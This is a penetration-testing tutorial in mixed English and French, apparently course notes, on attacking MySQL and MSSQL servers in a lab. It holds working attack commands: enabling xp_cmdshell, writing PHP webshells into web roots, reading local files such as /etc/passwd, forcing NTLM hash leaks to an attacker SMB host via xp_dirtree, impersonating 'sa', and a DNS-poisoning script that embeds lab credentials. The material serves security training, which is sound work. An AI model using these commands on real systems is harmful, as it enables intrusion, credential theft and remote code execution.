# Attacking SQL Databases

[<mark style="color:orange;">**MySQL**</mark>](https://www.mysql.com/) and [<mark style="color:orange;">**Microsoft SQL Server**</mark>](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) are [<mark style="color:orange;">**relational database**</mark>](https://en.wikipedia.org/wiki/Relational_database) management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL & MySQL use the [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) for querying and maintaining the database.

***

### <mark style="color:blue;">Enumeration</mark>

By default, MSSQL uses ports **`TCP/1433` and `UDP/1434`**, and MySQL uses **`TCP/3306`**. However, when MSSQL operates in a "hidden" mode, it uses the **`TCP/2433`** port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:

#### <mark style="color:green;">**Banner Grabbing**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

```

The Nmap scan reveals essential information about the target, like the version and hostname, which we can use to identify common misconfigurations, specific attacks, or known vulnerabilities. Let's explore some common misconfigurations and protocol specifics attacks.

***

### <mark style="color:blue;">Authentication Mechanisms</mark>

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Authentication Type</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Windows authentication mode</code></td><td>This is the default, often referred to as <code>integrated</code> security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</td></tr><tr><td><code>Mixed mode</code></td><td>Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.</td></tr></tbody></table>

#### <mark style="color:green;">🔒</mark> <mark style="color:green;"></mark><mark style="color:green;">**Authentification dans MySQL**</mark>

* **MySQL** permet plusieurs méthodes d'authentification :
  * **Nom d'utilisateur et mot de passe** (le plus courant).
  * **Authentification Windows** (mais cela nécessite un **plugin** spécial).

👉 Les administrateurs choisissent la méthode en fonction de :

* **Sécurité** – Pour protéger l'accès.
* **Compatibilité** – Pour s'assurer que ça fonctionne avec d'anciens systèmes.
* **Facilité d'utilisation** – Pour simplifier l'accès des utilisateurs.

***

#### <mark style="color:green;">⚠️</mark> <mark style="color:green;"></mark><mark style="color:green;">**Vulnérabilité CVE-2012-2122 (MySQL 5.6.x)**</mark>

* **Problème :**
  * Une faille dans les anciennes versions de **MySQL 5.6.x** permettait de **contourner l'authentification**.
  * Un attaquant pouvait accéder au serveur **sans connaître le bon mot de passe**.

***

#### <mark style="color:green;">🕵️‍♂️</mark> <mark style="color:green;"></mark><mark style="color:green;">**Comment ça marche (attaque par timing)**</mark>

* **Timing attack** = Exploite le **temps de réponse** du serveur pour deviner le mot de passe.

🔹 **Explication :**

1. Quand tu te connectes à MySQL, si tu mets un **mauvais mot de passe**, MySQL met plus de temps à répondre.
2. Si tu mets le bon mot de passe, la réponse est **plus rapide**.
3. En testant **le même mauvais mot de passe plusieurs fois**, MySQL peut **accidentellement accepter ce mot de passe** après plusieurs tentatives.

***

#### <mark style="color:green;">🧩</mark> <mark style="color:green;"></mark><mark style="color:green;">**Pourquoi ça se produit ?**</mark>

* Le problème vient de la façon dont **MySQL compare les mots de passe** en interne.
* Lorsqu'il y a un **décalage dans la comparaison**, MySQL peut penser que c'est correct et laisser passer la connexion.

***

### <mark style="color:blue;">**Misconfigurations**</mark>

Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

<mark style="color:green;">**Privileges**</mark>

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

* Read or change the contents of a database
* Read or change the server configuration
* Execute commands
* Read local files
* Communicate with other databases
* Capture the local system hash
* Impersonate existing users
* Gain access to other networks

***

### <mark style="color:blue;">Protocol Specific Attacks</mark>

#### <mark style="color:green;">**MySQL - Connecting to the SQL Server**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
```

<mark style="color:green;">**Sqlcmd - Connecting to the SQL Server**</mark>

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

Note: When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:

```shell-session
mrroboteLiot@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

```shell-session
mrroboteLiot@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7

```

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```shell-session
mrroboteLiot@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

#### 📚 <mark style="color:green;">**SQL Default Databases**</mark>

Quand tu travailles avec MySQL ou MSSQL, il existe des **bases de données système** qui sont créées automatiquement lors de l'installation. Elles sont essentielles au bon fonctionnement du serveur SQL et contiennent des informations clés sur les autres bases de données, les utilisateurs, les permissions, etc.

Ces bases sont utiles pour :

* **Lister toutes les bases de données** présentes sur le serveur.
* **Explorer les tables et colonnes** de chaque base.
* **Surveiller les performances du serveur**.

***

#### <mark style="color:green;">⚠️</mark> <mark style="color:green;"></mark><mark style="color:green;">**Attention aux Permissions !**</mark>

👉 **Si tu n'as pas les permissions** nécessaires, tu obtiendras une **erreur** en essayant de lister ou de te connecter à ces bases.

***

#### <mark style="color:green;">🔎</mark> <mark style="color:green;"></mark><mark style="color:green;">**Bases de Données Système - MySQL**</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Nom de la Base</strong></td><td><strong>Description</strong></td></tr><tr><td><strong>mysql</strong></td><td>Base principale qui contient des tables avec toutes les <strong>informations de configuration</strong> du serveur (utilisateurs, permissions, etc.).</td></tr><tr><td><strong>information_schema</strong></td><td>Permet d'accéder à des <strong>métadonnées</strong> (informations sur les bases de données, tables, colonnes).</td></tr><tr><td><strong>performance_schema</strong></td><td>Outil de <strong>surveillance des performances</strong> du serveur. Il analyse les requêtes exécutées pour détecter les problèmes.</td></tr><tr><td><strong>sys</strong></td><td>Ensemble d'outils pour aider les développeurs à <strong>analyser les performances</strong> et interpréter les données du <code>performance_schema</code>.</td></tr></tbody></table>

***

#### <mark style="color:green;">🔎</mark> <mark style="color:green;"></mark><mark style="color:green;">**Bases de Données Système - MSSQL (Microsoft SQL Server)**</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Nom de la Base</strong></td><td><strong>Description</strong></td></tr><tr><td><strong>master</strong></td><td>Base la plus importante. Elle stocke <strong>toutes les informations</strong> du serveur SQL (instances, connexions, etc.).</td></tr><tr><td><strong>msdb</strong></td><td>Utilisée par <strong>SQL Server Agent</strong> pour la planification des tâches (backups, jobs automatiques).</td></tr><tr><td><strong>model</strong></td><td>Modèle utilisé pour <strong>créer de nouvelles bases de données</strong>. Chaque fois qu'une nouvelle base est créée, elle est copiée depuis <code>model</code>.</td></tr><tr><td><strong>resource</strong></td><td>Base en lecture seule contenant <strong>les objets système</strong>. Ces objets apparaissent dans toutes les bases via le schéma <code>sys</code>.</td></tr><tr><td><strong>tempdb</strong></td><td>Base temporaire utilisée pour stocker des <strong>objets temporaires</strong> (comme des tables temporaires dans les requêtes). Elle est recréée à chaque redémarrage.</td></tr></tbody></table>

#### <mark style="color:green;">**SQL Syntax**</mark>

<mark style="color:orange;">**Show Databases**</mark>

```shell-session
mysql> SHOW DATABASES;
```

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

<mark style="color:orange;">**Select a Database**</mark>

```shell-session
mysql> USE htbusers;

Database changed
```

Attacking SQL Databases

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

<mark style="color:orange;">**Show Tables**</mark>

```shell-session
mysql> SHOW TABLES;
```

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```

<mark style="color:orange;">**Select all Data from Table "users"**</mark>

```shell-session
mysql> SELECT * FROM users;
```

```cmd-session
1> SELECT * FROM users
2> go
```

***

### <mark style="color:blue;">Execute Commands</mark>

Command execution is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL.

* `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp\_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
* The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
* `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

To execute commands using SQL syntax on MSSQL, use:

#### <mark style="color:green;">**XP\_CMDSHELL**</mark>

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

{% hint style="danger" %}
There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.&#x20;

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.
{% endhint %}

***

### <mark style="color:blue;">Write Local Files</mark>

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.

<mark style="color:green;">**MySQL - Write Local File**</mark>

{% code fullWidth="true" %}
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```
{% endcode %}

In `MySQL`, a global system variable [secure\_file\_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD\_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

* If empty, the variable has no effect, which is not a secure setting.
* If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
* If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

#### <mark style="color:green;">**MySQL - Secure File Privileges**</mark>

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### <mark style="color:green;">**MSSQL - Enable Ole Automation Procedures**</mark>

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### <mark style="color:green;">**MSSQL - Create a File**</mark>

<pre class="language-cmd-session" data-full-width="true"><code class="lang-cmd-session"><strong>1> DECLARE @OLE INT
</strong>2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&#x3C;?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
</code></pre>

***

### <mark style="color:blue;">Read Local Files</mark>

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

#### <mark style="color:green;">**Read Local Files in MSSQL**</mark>

<pre class="language-cmd-session" data-full-width="true"><code class="lang-cmd-session"><strong>1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
</strong>2> GO

BulkColumn

</code></pre>

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

#### <mark style="color:green;">**MySQL - Read Local Files in MySQL**</mark>

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

```

***

### <mark style="color:blue;">Capture MSSQL Service Hash</mark>

In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

#### <mark style="color:green;">**XP\_DIRTREE Hash Stealing**</mark>

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### <mark style="color:green;">**XP\_SUBDIRS Hash Stealing**</mark>

{% code fullWidth="true" %}
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```
{% endcode %}

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

#### <mark style="color:green;">**XP\_SUBDIRS Hash Stealing with Responder**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo responder -I tun0
```
{% endcode %}

#### <mark style="color:green;">**XP\_SUBDIRS Hash Stealing with impacket**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
```
{% endcode %}

***

### <mark style="color:blue;">Impersonate Existing Users with MSSQL</mark>

SQL Server a une permission spéciale, appelée IMPERSONATE, qui permet à l'utilisateur en cours d'exécution d'adopter les permissions d'un autre utilisateur ou login jusqu'à ce que le contexte soit réinitialisé ou que la session se termine. Explorons comment le privilège IMPERSONATE peut mener à une élévation de privilèges dans SQL Server.\
D'abord, nous devons identifier les utilisateurs que nous pouvons usurper. Les administrateurs système (sysadmins) peuvent usurper n'importe qui par défaut. Mais pour les utilisateurs non administrateurs, les privilèges doivent être attribués explicitement. Nous pouvons utiliser la requête suivante pour identifier les utilisateurs que nous pouvons usurper :

#### <mark style="color:green;">**Identify Users that We Can Impersonate**</mark>

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

#### <mark style="color:green;">**Verifying our Current User and Role**</mark>

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

#### <mark style="color:green;">**Impersonating the SA User**</mark>

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

note il est recommandé d’exécuter EXECUTE AS LOGIN dans la base de données master car tous les utilisateurs y ont accès par défaut si l’utilisateur que vous essayez d’usurper n’a pas accès à la base de données à laquelle vous vous connectez cela entraînera une erreur essayez de passer à la base master avec USE master\
nous pouvons maintenant exécuter n’importe quelle commande en tant que sysadmin comme l’indique la valeur retournée 1 pour annuler l’opération et revenir à l’utilisateur précédent nous pouvons utiliser l’instruction transact-sql REVERT\
note si nous trouvons un utilisateur qui n’est pas sysadmin nous pouvons quand même vérifier s’il a accès à d’autres bases de données ou serveurs liés

***

### <mark style="color:blue;">Communicate with Other Databases with MSSQL</mark>

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

#### <mark style="color:green;">**Identify linked Servers in MSSQL**</mark>

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

{% code fullWidth="true" %}
```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```
{% endcode %}

Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.&#x20;

***

{% hint style="info" %}
<mark style="color:orange;">**Initiation of the Attack**</mark>
{% endhint %}

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>XP_DIRTREE</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>1.</code></td><td>The source here is the user input, which specifies the function and the folder shared in the network.</td><td><code>Source</code></td></tr><tr><td><code>2.</code></td><td>The process should ensure that all contents of the specified folder are displayed to the user.</td><td><code>Process</code></td></tr><tr><td><code>3.</code></td><td>The execution of system commands on the MSSQL server requires elevated privileges with which the service executes the commands.</td><td><code>Privileges</code></td></tr><tr><td><code>4.</code></td><td>The SMB service is used as the destination to which the specified information is forwarded.</td><td><code>Destination</code></td></tr></tbody></table>

{% hint style="info" %}
This is when the cycle starts all over again, but this time to obtain the NTLMv2 hash of the MSSQL service user.

<mark style="color:orange;">**Steal The Hash**</mark>
{% endhint %}

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Stealing the Hash</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>5.</code></td><td>Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service.</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>The data is then processed, and the specified folder is queried for the contents.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>The associated authentication hash is used accordingly since the MSSQL running user queries the service.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>In this case, the destination for the authentication and query is the host we control and the shared folder on the network.</td><td><code>Destination</code></td></tr></tbody></table>

{% hint style="info" %}
Finally, the hash is intercepted by tools like `Responder`, `WireShark`, or `TCPDump` and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL. For example, another interesting method would be to execute Python code in a SQL query. We can find more about this in the [documentation](https://docs.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver15) from Microsoft. However, this and other possibilities of what we can do with MSSQL will be discussed in another module.
{% endhint %}

***

### <mark style="color:blue;">🗄️ SQL Server Linked Server Exploitation</mark> <a href="#sql-server-linked-server" id="sql-server-linked-server"></a>

#### Concept Théorique

Les **Linked Servers** permettent à une instance SQL Server d'exécuter des requêtes sur une autre instance. Si mal configurés, ils peuvent :

* Exposer des credentials en clair
* Permettre l'exécution de commandes à distance
* Faciliter le pivoting dans le réseau

#### Architecture des Linked Servers

```
┌─────────────────────┐         OPENQUERY          ┌─────────────────┐
│   SQL Server A      │─────────────────────────────>│  SQL Server B   │
│  (S200401)          │  Credentials: sqlmgmt       │    (SQL07)      │
│  Port: 6520         │  Password: bIhBbzMMnB82yx   │  Port: 1433     │
└─────────────────────┘                              └─────────────────┘
```

#### Énumération des Linked Servers

**1. Lister les serveurs liés**

```sql
-- Méthode 1 : sys.servers
SELECT * FROM sys.servers;

-- Méthode 2 : sp_helpserver
EXEC sp_helpserver;

-- Méthode 3 : sys.linked_logins
SELECT * FROM sys.linked_logins;
```

**2. Tester la connectivité**

```sql
-- Exécuter une requête sur le serveur lié
SELECT * FROM OPENQUERY([SQL07], 'SELECT @@version');

-- Alternative
EXEC ('SELECT SYSTEM_USER') AT [SQL07];
```

**3. Énumérer les bases de données distantes**

```sql
EXEC ('SELECT name FROM sys.databases') AT [SQL07];
```

#### Exploitation via DNS Poisoning

**Scénario**

1. SQL Server A essaie de se connecter à SQL07
2. SQL07 n'existe pas → requête DNS
3. DNS empoisonné retourne IP de l'attaquant
4. SQL Server A se connecte à l'attaquant
5. L'attaquant capture les credentials

**Code d'exploitation complet**

```bash
#!/bin/bash

# 1. Empoisonner le DNS
python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  --record 'SQL07' --action add --data 10.10.15.75 10.129.17.103

# 2. Démarrer Responder
sudo responder -I tun0 -v &

# 3. Se connecter au SQL Server
impacket-mssqlclient -port 6520 OVERWATCH/sqlsvc@10.129.17.103 -windows-auth

# 4. Déclencher la connexion
# SQL> SELECT * FROM OPENQUERY([SQL07], 'SELECT 1');
```

#### Autres Techniques d'Exploitation

**1. RPC Out Enabled**

```sql
-- Vérifier si RPC Out est activé
SELECT is_rpc_out_enabled FROM sys.servers WHERE name = 'SQL07';

-- Si activé, possibilité d'exécuter xp_cmdshell à distance
EXEC ('EXEC xp_cmdshell ''whoami''') AT [SQL07];
```

**2. Credential Theft via xp\_dirtree**

```sql
-- Forcer une authentification SMB
EXEC xp_dirtree '\\ATTACKER_IP\share';

-- Capturer le hash avec Responder
```

**3. Double Hop Attack**

```sql
-- Chaîner plusieurs serveurs liés
SELECT * FROM OPENQUERY([SQL07], 
  'SELECT * FROM OPENQUERY([SQL08], ''SELECT @@version'')');
```

#### Détection

```sql
-- Auditer les connexions aux linked servers
SELECT 
    s.name AS ServerName,
    l.remote_name,
    l.uses_self_credential
FROM sys.servers s
LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id;
```

***
